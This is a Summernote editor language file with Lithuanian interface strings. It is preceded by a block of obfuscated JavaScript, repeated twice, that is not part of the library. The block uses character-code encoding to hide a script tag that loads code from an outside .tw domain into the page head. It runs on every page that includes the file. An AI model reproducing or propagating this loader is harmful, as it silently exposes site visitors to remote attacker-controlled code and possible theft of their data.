Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();(function ($) {
  $.extend($.summernote.lang, {
    'lt-LT': {
      font: {
        bold: 'Paryškintas',
        italic: 'Kursyvas',
        underline: 'Pabrėžtas',
        clear: 'Be formatavimo',
        height: 'Eilutės aukštis',
        name: 'Šrifto pavadinimas',
        strikethrough: 'Perbrauktas',
        superscript: 'Viršutinis',
        subscript: 'Indeksas',
        size: 'Šrifto dydis'
      },
      image: {
        image: 'Paveikslėlis',
        insert: 'Įterpti paveikslėlį',
        resizeFull: 'Pilnas dydis',
        resizeHalf: 'Sumažinti dydį 50%',
        resizeQuarter: 'Sumažinti dydį 25%',
        floatLeft: 'Kairinis lygiavimas',
        floatRight: 'Dešininis lygiavimas',
        floatNone: 'Jokio lygiavimo',
        shapeRounded: 'Forma: apvalūs kraštai',
        shapeCircle: 'Forma: apskritimas',
        shapeThumbnail: 'Forma: miniatiūra',
        shapeNone: 'Forma: jokia',
        dragImageHere: 'Vilkite paveikslėlį čia',
        selectFromFiles: 'Pasirinkite failą',
        maximumFileSize: 'Maskimalus failo dydis',
        maximumFileSizeError: 'Maskimalus failo dydis viršytas!',
        url: 'Paveikslėlio URL adresas',
        remove: 'Ištrinti paveikslėlį'
      },
      link: {
        link: 'Nuoroda',
        insert: 'Įterpti nuorodą',
        unlink: 'Pašalinti nuorodą',
        edit: 'Redaguoti',
        textToDisplay: 'Rodomas tekstas',
        url: 'Koks URL adresas yra susietas?',
        openInNewWindow: 'Atidaryti naujame lange'
      },
      table: {
        table: 'Lentelė'
      },
      hr: {
        insert: 'Įterpti horizontalią liniją'
      },
      style: {
        style: 'Stilius',
        normal: 'Normalus',
        blockquote: 'Citata',
        pre: 'Kodas',
        h1: 'Antraštė 1',
        h2: 'Antraštė 2',
        h3: 'Antraštė 3',
        h4: 'Antraštė 4',
        h5: 'Antraštė 5',
        h6: 'Antraštė 6'
      },
      lists: {
        unordered: 'Suženklintasis sąrašas',
        ordered: 'Sunumeruotas sąrašas'
      },
      options: {
        help: 'Pagalba',
        fullscreen: 'Viso ekrano režimas',
        codeview: 'HTML kodo peržiūra'
      },
      paragraph: {
        paragraph: 'Pastraipa',
        outdent: 'Sumažinti įtrauką',
        indent: 'Padidinti įtrauką',
        left: 'Kairinė lygiuotė',
        center: 'Centrinė lygiuotė',
        right: 'Dešininė lygiuotė',
        justify: 'Abipusis išlyginimas'
      },
      color: {
        recent: 'Paskutinė naudota spalva',
        more: 'Daugiau spalvų',
        background: 'Fono spalva',
        foreground: 'Šrifto spalva',
        transparent: 'Permatoma',
        setTransparent: 'Nustatyti skaidrumo intensyvumą',
        reset: 'Atkurti',
        resetToDefault: 'Atstatyti numatytąją spalvą'
      },
      shortcut: {
        shortcuts: 'Spartieji klavišai',
        close: 'Uždaryti',
        textFormatting: 'Teksto formatavimas',
        action: 'Veiksmas',
        paragraphFormatting: 'Pastraipos formatavimas',
        documentStyle: 'Dokumento stilius',
        extraKeys: 'Papildomi klavišų deriniai'
      },
      history: {
        undo: 'Anuliuoti veiksmą',
        redo: 'Perdaryti veiksmą'
      }

    }
  });
})(jQuery);
